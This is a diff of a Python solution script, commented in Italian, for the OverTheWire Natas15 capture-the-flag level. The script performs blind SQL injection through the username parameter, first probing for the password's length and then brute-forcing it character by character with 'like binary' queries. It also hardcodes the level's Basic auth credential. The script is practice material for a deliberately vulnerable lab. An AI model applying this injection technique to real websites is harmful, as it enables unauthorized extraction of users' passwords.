@@ -1,27 +1,31 @@
+''' 
+Solution-Script for Natas15 - OverTheWire
+
+Daruma's_eye
+'''
 from string import ascii_letters
-from string import ascii_digits
+from string import digits
 from time import sleep
-from requests import get
-from requests.auth import HTTPBasicAuth
-from urllib.parse import quote
-from bs4 import BeautifulSoup
+from requests import get            # ==>  per fare richieste get
+from urllib.parse import quote      # ==>  per fare codificare l'injection in codifica URL
+from bs4 import BeautifulSoup       # ==>  libreria per fare il parsing di oggetti HTML e XML
+alpha_numeric  = ascii_letters + digits
+delay          = 0.1
 
-alpha_numeric = ascii_letters+ascii_digits
-strained_chars = '' 
-delay=0.1
+#Header delle richieste get, viene usato il campo Auth per accdere al sito tramite password,
+#   il valore è un base64 dell'utente e della password
+header={'Host'         : 'natas15.natas.labs.overthewire.org'\
+       ,'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'}
 
-#Quali di questi header sono fondamentali?
-header={'Host': 'natas15.natas.labs.overthewire.org'\
-,'Accept-Encoding': 'gzip, deflate'\
-,'DNT': '1'\
-,'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'}
 
+#Nella prima parte si applica la query { natas16" and password like '___' ; # } 
+#   al campo username per stimare la lunghezza della password, si utlizza la libreria BeautifulSoup
+#   per prelevare il contenuto del tag nel quale possiamo trovare l'output "This user exists." 
+#   oppure  "This user doesn\'t exist." 
 incomplete_injection = 'natas16" and password like \''
 
 password_length = 0
-
-#Codice per trovare la lunghezza della password
-while true:
+while True:
     password_length += 1
     print( 'Testing password of '+str( password_length )+' chars' )
     incomplete_injection = incomplete_injection + '_'
@@ -30,57 +34,67 @@ while true:
     injection = quote( injection,safe= '')
     url = 'http://natas15.natas.labs.overthewire.org/?username='+ injection
     
-    req = get( url, headers= header )
+    req  = get( url, headers= header )
+
+    #Nella prima riga si preleva l'oggetto HTML, nella seconda si naviga all'interno
+    #   del documento sfruttando i tag (body, div) e le proprietà della libreria (next, string)
     soup = BeautifulSoup( req.text, 'html.parser' )
     search_output= soup.body.div.next.string
     
-    if(search_output=='\r\nThis user exists.'):
+    if( search_output == '\r\nThis user exists.' ):
         break
-    elif(search_output=='\r\nThis user doesn\'t exist.'):
-        print('not this length...skipping')
+
+    elif( search_output == '\r\nThis user doesn\'t exist.' ):
+        print( 'This is not the right length...Incrementing...' )
     else:
-        print('########## GENERIC ERROR ##########')
-        break
+        print( '########## GENERIC ERROR ##########' )
+        exit(1)
 
     sleep( delay )
 
-print( 'Seems that the password is '+str( password_length )+' chars long' )
+print( 'It seems that the password is '+str( password_length )+' chars long.\nWe can proceed with bruteforcing...' )
+
+sleep( 0.5 )
 
 
+#Nella seconda parte si applica la query { natas16" and password like ''; # } 
+#   come nella prima parte ma in questo caso si fa il bruteforcing carattere per carattere 
 password=''
-
-
 for i in range( password_length ):
-    #specificare l'utilizzo di binary     
-    payload = 'natas16" and password like binary \''
 
     for char in alpha_numeric:
-        print('Testing char '+char+' for position '+str(i))
-        payload2=payload+password+char
-        if(i!=password_length-1):
-            for j in range(password_length-i-1):
-                payload2= payload2+'_'
 
-        payload2= payload2+'\';# '
-        print('Testing '+payload2)
-        payload2 = quote(payload2,safe='')
-        link='http://natas15.natas.labs.overthewire.org/?username='+payload2
-    
-        req = get(link, headers=head)
-        soup = BeautifulSoup(req.text, 'html.parser')
+        print( 'Testing char '+ char +' for position '+ str(i) )
+        injection = 'natas16" and password like binary \'' + password + char
+        
+        if( i!=password_length-1 ):
+            for j in range(password_length-i-1):
+                injection = injection+'_'
+        injection= injection+'\';# '     
+        print( 'Testing '+injection )
+
+        injection = quote( injection,safe='' )
+        link = 'http://natas15.natas.labs.overthewire.org/?username='+injection
+        req  = get( link, headers= header )
+        
+        #Nella prima riga si preleva l'oggetto HTML, nella seconda si naviga all'interno
+        #   del documento sfruttando i tag (body, div) e le proprietà della libreria (next, string)
+        soup = BeautifulSoup( req.text, 'html.parser' )
         search_output= soup.body.div.next.string
     
-        if(search_output=='\r\nThis user exists.'):
-            password=password+char
-            print('#### We have char of position '+str(i)+': '+char)
-            break
-        elif(search_output=='\r\nThis user doesn\'t exist.'):
-            print('not this char...skipping')
+        if( search_output == '\r\nThis user exists.' ):
+            password = password+char
+            print( 'The char of position '+ str(i) +' is : '+ char )
+            break 
+
+        elif( search_output == '\r\nThis user doesn\'t exist.' ):
+            print( 'This is not the right char for this position...' )
+        
         else:
-            print('########## GENERIC ERROR ##########')
+            print( '########## GENERIC ERROR ##########' )
             exit(1)
 
-        sleep(.100)
+        sleep( delay )
 
-print('We have the password! Here it is: '+password)
+print( 'We have the password! Here it is: '+password )
 
